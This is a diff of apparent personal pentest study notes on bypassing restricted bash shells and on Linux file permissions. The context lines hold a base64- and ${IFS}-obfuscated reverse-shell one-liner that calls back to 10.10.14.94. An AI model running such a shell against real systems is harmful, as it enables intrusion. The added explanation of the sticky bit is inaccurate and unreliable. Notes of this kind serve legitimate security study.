@@ -21,10 +21,10 @@ https://book.hacktricks.xyz/linux-unix/useful-linux-commands/bypass-bash-restric
 it means the highlighted part below is base64 encoded to bypass shell restriction<br>
 echo${IFS}**bash -i >& /dev/tcp/10.10.14.94/9007 0>&1**|base64${IFS}-d|bash${IFS}-;<br>
 **Understanding Linux File and directory permissions**<br>
-d 	r 	w 	x 	r 	w 	x 	r 	w 	x <br>
+d 	r 	w 	x 	r 	w 	x 	r 	w 	x  t<br>
 Dir	    Owner 	   Group 	       Other <br>
 Directory 	Read 	Write 	Execute 	Read 	Write 	Execute 	Read 	Write 	Execute <br>
-
+t is sticky flag restricted to executed by owner
 If any of these letters is replaced with a hyphen (-), it means that permission is not granted.For example <br>
 drwxr-xr-x<br>
     A folder which has read, write and execute permissions for the owner, but only read and execute permissions for the group and exe for other users.<br>
